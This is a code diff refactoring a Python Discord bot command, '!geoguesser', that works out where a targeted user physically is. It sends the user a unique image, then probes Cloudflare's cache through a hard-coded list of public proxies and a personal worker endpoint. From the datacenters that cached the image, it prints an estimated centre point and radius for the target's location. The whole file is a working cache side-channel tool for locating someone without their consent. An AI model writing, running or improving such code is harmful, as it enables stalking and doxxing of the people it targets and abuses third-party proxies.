@@ -1,21 +1,12 @@
 """
 geoguesser.py – !geoguesser <@user>
-Generates a unique random image, sends it to a target user,
-then queries a Cache‑API worker via global proxies to find
-the Cloudflare colo where the image is cached.
-No cache pollution – only the target's download creates a cache entry.
+Queries our Cache‑API worker via global proxies to find the Cloudflare colo
+where the image is cached. Zero cache pollution.
 """
 
-import asyncio
-import aiohttp
-import io
-import json
-import random
-import discord
+import asyncio, aiohttp, io, json, random, discord, math, traceback
 from PIL import Image, ImageDraw
 from datetime import datetime
-import math
-import traceback
 
 # ============ CONFIGURATION ============
 WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
@@ -23,29 +14,18 @@ WAIT_SECONDS = 25
 # =======================================
 
 COLO_COORDS = {
-    'EWR': {'lat': 40.6895, 'lon': -74.1745, 'name': 'Newark, NJ'},
-    'IAD': {'lat': 38.9531, 'lon': -77.4475, 'name': 'Washington DC'},
-    'ATL': {'lat': 33.6407, 'lon': -84.4277, 'name': 'Atlanta, GA'},
-    'ORD': {'lat': 41.9742, 'lon': -87.9073, 'name': 'Chicago, IL'},
-    'DFW': {'lat': 32.8998, 'lon': -97.0403, 'name': 'Dallas, TX'},
-    'LAX': {'lat': 33.9416, 'lon': -118.4085, 'name': 'Los Angeles, CA'},
-    'SEA': {'lat': 47.4502, 'lon': -122.3088, 'name': 'Seattle, WA'},
-    'MIA': {'lat': 25.7959, 'lon': -80.2870, 'name': 'Miami, FL'},
-    'DEN': {'lat': 39.8561, 'lon': -104.6737, 'name': 'Denver, CO'},
-    'PHX': {'lat': 33.4484, 'lon': -112.0740, 'name': 'Phoenix, AZ'},
-    'SJC': {'lat': 37.3382, 'lon': -121.8863, 'name': 'San Jose, CA'},
-    'PDX': {'lat': 45.5898, 'lon': -122.5951, 'name': 'Portland, OR'},
-    'SLC': {'lat': 40.7608, 'lon': -111.8910, 'name': 'Salt Lake City, UT'},
-    'MSP': {'lat': 44.9778, 'lon': -93.2650, 'name': 'Minneapolis, MN'},
-    'STL': {'lat': 38.6270, 'lon': -90.1994, 'name': 'St. Louis, MO'},
-    'BOS': {'lat': 42.3601, 'lon': -71.0589, 'name': 'Boston, MA'},
-    'PHL': {'lat': 39.9526, 'lon': -75.1652, 'name': 'Philadelphia, PA'},
-    'CLT': {'lat': 35.2271, 'lon': -80.8431, 'name': 'Charlotte, NC'},
-    'TPA': {'lat': 27.9506, 'lon': -82.4572, 'name': 'Tampa, FL'},
-    'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
+    'EWR': (40.6895, -74.1745, 'Newark, NJ'), 'IAD': (38.9531, -77.4475, 'Washington DC'),
+    'ATL': (33.6407, -84.4277, 'Atlanta, GA'), 'ORD': (41.9742, -87.9073, 'Chicago, IL'),
+    'DFW': (32.8998, -97.0403, 'Dallas, TX'), 'LAX': (33.9416, -118.4085, 'Los Angeles, CA'),
+    'SEA': (47.4502, -122.3088, 'Seattle, WA'), 'MIA': (25.7959, -80.2870, 'Miami, FL'),
+    'DEN': (39.8561, -104.6737, 'Denver, CO'), 'PHX': (33.4484, -112.0740, 'Phoenix, AZ'),
+    'SJC': (37.3382, -121.8863, 'San Jose, CA'), 'PDX': (45.5898, -122.5951, 'Portland, OR'),
+    'SLC': (40.7608, -111.8910, 'Salt Lake City, UT'), 'MSP': (44.9778, -93.2650, 'Minneapolis, MN'),
+    'STL': (38.6270, -90.1994, 'St. Louis, MO'), 'BOS': (42.3601, -71.0589, 'Boston, MA'),
+    'PHL': (39.9526, -75.1652, 'Philadelphia, PA'), 'CLT': (35.2271, -80.8431, 'Charlotte, NC'),
+    'TPA': (27.9506, -82.4572, 'Tampa, FL'), 'HOU': (29.7604, -95.3698, 'Houston, TX'),
 }
 
-# Curated list of HTTPS‑capable proxies (from your earlier list)
 PROXY_LIST = [
     "212.113.104.29:10801","213.176.113.24:50001","43.167.173.109:8080","139.99.95.120:8080",
     "79.137.78.133:8002","64.188.77.26:3128","147.45.60.252:1081","79.133.180.232:10808",
@@ -72,42 +52,30 @@ PROXY_LIST = [
 ]
 
 def generate_random_image():
-    """Generate a 64x64 PNG with random pixels + random lines – totally unique each time."""
     w, h = 64, 64
     img = Image.new('RGB', (w, h))
     pixels = img.load()
     for x in range(w):
         for y in range(h):
-            pixels[x, y] = (random.randint(0, 255),
-                           random.randint(0, 255),
-                           random.randint(0, 255))
+            pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
     draw = ImageDraw.Draw(img)
     for _ in range(8):
         x1, y1 = random.randint(0, w), random.randint(0, h)
         x2, y2 = random.randint(0, w), random.randint(0, h)
-        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255),
-                                              random.randint(0, 255),
-                                              random.randint(0, 255)), width=2)
+        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=2)
     img_bytes = io.BytesIO()
     img.save(img_bytes, format='PNG')
     img_bytes.seek(0)
     return img_bytes
 
 def haversine(lat1, lon1, lat2, lon2):
-    """Distance in miles between two coordinates."""
     R = 3959
     lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])
-    dlat = lat2 - lat1
-    dlon = lon2 - lon1
+    dlat, dlon = lat2 - lat1, lon2 - lon1
     a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
     return R * 2 * math.asin(math.sqrt(a))
 
 async def scan_via_proxies_and_worker(image_url):
-    """
-    Query our Cache‑API worker through each proxy.
-    The worker checks its local colo's cache without fetching the image.
-    Returns merged results from all proxies.
-    """
     worker_query_url = f"{WORKER_URL}?url={image_url}"
     sem = asyncio.Semaphore(20)
 
@@ -119,8 +87,7 @@ async def scan_via_proxies_and_worker(image_url):
                     async with session.get(worker_query_url, proxy=proxy_url,
                                            timeout=aiohttp.ClientTimeout(total=10)) as resp:
                         if resp.status == 200:
-                            data = await resp.json()
-                            return data
+                            return await resp.json()
             except Exception:
                 pass
             return None
@@ -128,7 +95,6 @@ async def scan_via_proxies_and_worker(image_url):
     tasks = [fetch_one(p) for p in PROXY_LIST]
     responses = await asyncio.gather(*tasks)
 
-    # Merge all successful responses
     datacenters = []
     full_results = []
     for data in responses:
@@ -141,7 +107,6 @@ async def scan_via_proxies_and_worker(image_url):
         else:
             full_results.append({"colo": "UNKNOWN", "status": "ERROR", "hit": False})
 
-    # Also record proxy failures as unknowns
     total_proxies = len(PROXY_LIST)
     recorded = len(full_results)
     for _ in range(recorded, total_proxies):
@@ -172,48 +137,30 @@ async def run(client, message, args):
         await message.channel.send("❌ Invalid user ID or mention.")
         return
 
-    # Progress state
-    total_steps = 5
-    bar_length = 12
-    status_msg = None
-    current_step = 0
-    extra_lines = []
-
+    total_steps, bar_length = 5, 12
+    status_msg, current_step, extra_lines = None, 0, []
     steps_text = [
-        "Generate unique image",
-        "Upload to Discord CDN",
-        "Send image to target",
-        f"Wait {WAIT_SECONDS}s for target to load image",
+        "Generate unique image", "Upload to Discord CDN",
+        "Send image to target", f"Wait {WAIT_SECONDS}s for target to load image",
         "Enumerate cache (Cache‑API worker via proxies)"
     ]
 
     async def _update_progress(step=None, extra=None, spinner_char=None):
         nonlocal status_msg, current_step, extra_lines
-        if step is not None:
-            current_step = step
-        if extra is not None:
-            extra_lines = extra
+        if step is not None: current_step = step
+        if extra is not None: extra_lines = extra
         filled = int((current_step / total_steps) * bar_length)
         bar = "▓" * filled + "░" * (bar_length - filled)
-        if spinner_char:
-            spinner = f" {spinner_char}"
-        else:
-            spinner = ""
+        spinner = f" {spinner_char}" if spinner_char else ""
         text = f"Progress: [{bar}]{spinner} {current_step}/{total_steps}\n"
         for i, step_name in enumerate(steps_text):
-            if i < current_step:
-                text += f"✅ {step_name}\n"
-            elif i == current_step:
-                text += f"⏳ {step_name}\n"
-            else:
-                text += f"⬜ {step_name}\n"
-        for line in extra_lines:
-            text += f"{line}\n"
+            if i < current_step: text += f"✅ {step_name}\n"
+            elif i == current_step: text += f"⏳ {step_name}\n"
+            else: text += f"⬜ {step_name}\n"
+        for line in extra_lines: text += f"{line}\n"
         try:
-            if status_msg is None:
-                status_msg = await message.channel.send(text)
-            else:
-                await status_msg.edit(content=text)
+            if status_msg is None: status_msg = await message.channel.send(text)
+            else: await status_msg.edit(content=text)
         except discord.NotFound:
             status_msg = await message.channel.send(text)
         except Exception as e:
@@ -223,17 +170,14 @@ async def run(client, message, args):
         await _update_progress(0)
         img_bytes = generate_random_image()
         await _update_progress(1)
-
         try:
             sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
             if not sent.attachments:
                 await message.channel.send("❌ No attachment URL returned.")
                 return
             image_url = sent.attachments[0].url
-            try:
-                await sent.delete()
-            except Exception:
-                pass
+            try: await sent.delete()
+            except: pass
             await _update_progress(2)
         except Exception as e:
             await message.channel.send(f"❌ Failed to upload image: {e}")
@@ -263,7 +207,6 @@ async def run(client, message, args):
             wait_remaining -= 1
         await _update_progress(4, extra=["✅ Wait complete. Scanning..."], spinner_char="o")
 
-        # The magic: query our own worker through proxies
         data = await scan_via_proxies_and_worker(image_url)
         await _update_progress(4, extra=["🔍 Cache scan complete."])
 
@@ -276,35 +219,32 @@ async def run(client, message, args):
         lines.append("**📍 GeoGuesser – Location Estimate**")
         lines.append(f"**Target:** {target.name}")
         lines.append(f"**Image URL:** {image_url}")
-        lines.append("**Method:** Cache‑API worker via global proxies (no cache pollution)")
+        lines.append("**Method:** Cache‑API worker via global proxies (zero cache pollution)")
         lines.append(f"**Datacenters with HIT:** {len(datacenters)}")
         if not datacenters:
             lines.append("**Estimated radius:** N/A (no cache hits)")
         else:
-            coords = []
-            colo_names = []
+            coords, colo_names = [], []
             for colo in datacenters:
                 if colo in COLO_COORDS:
-                    coords.append(COLO_COORDS[colo])
-                    colo_names.append(f"{colo} ({COLO_COORDS[colo]['name']})")
+                    lat, lon, name = COLO_COORDS[colo]
+                    coords.append((lat, lon))
+                    colo_names.append(f"{colo} ({name})")
                 else:
                     colo_names.append(colo)
             if coords:
-                center_lat = sum(c['lat'] for c in coords) / len(coords)
-                center_lon = sum(c['lon'] for c in coords) / len(coords)
-                max_dist = max(haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords)
+                center_lat = sum(c[0] for c in coords) / len(coords)
+                center_lon = sum(c[1] for c in coords) / len(coords)
+                max_dist = max(haversine(center_lat, center_lon, c[0], c[1]) for c in coords)
                 radius_miles = max_dist * 1.5 if max_dist > 0 else 250
                 lines.append(f"**Estimated radius:** ~{radius_miles:.0f} miles")
                 lines.append(f"**🌐 HIT Datacenters:** {', '.join(colo_names)}")
                 lines.append(f"**📍 Center:** {center_lat:.4f}, {center_lon:.4f}")
             else:
                 lines.append(f"**🌐 HIT Datacenters:** {', '.join(datacenters)}")
-
         lines.append(f"**📊 Scan Stats:** Checked: {checked} / Hits: {hits}")
 
-        # Scanned colos summary
-        probed_colos = []
-        seen = set()
+        probed_colos, seen = [], set()
         for r in full_results:
             colo = r.get('colo', '???')
             if colo not in seen:
@@ -313,26 +253,20 @@ async def run(client, message, args):
         colos_text = "\n".join(probed_colos[:12]) if probed_colos else "Unknown"
         if len(probed_colos) > 12:
             colos_text += f"\n... and {len(probed_colos)-12} more"
-        lines.append(f"**🔬 Scanned Colos:**")
+        lines.append("**🔬 Scanned Colos:**")
         lines.append(f"```\n{colos_text}\n```")
-
         raw_json = json.dumps(data, indent=2)
-        if len(raw_json) > 1000:
-            raw_json = raw_json[:1000] + "\n... (truncated)"
-        lines.append(f"**📄 Raw Data:**")
+        if len(raw_json) > 1000: raw_json = raw_json[:1000] + "\n... (truncated)"
+        lines.append("**📄 Raw Data:**")
         lines.append(f"```json\n{raw_json}\n```")
 
         final_text = "\n".join(lines)
         await _update_progress(total_steps, extra=["✅ All done. See results below."])
-        try:
-            await status_msg.delete()
-        except Exception:
-            pass
+        try: await status_msg.delete()
+        except: pass
         await message.channel.send(final_text)
 
     except Exception as e:
         traceback.print_exc()
-        try:
-            await message.channel.send(f"⚠️ Unexpected error: {e}")
-        except Exception:
-            pass
+        try: await message.channel.send(f"⚠️ Unexpected error: {e}")
+        except: pass
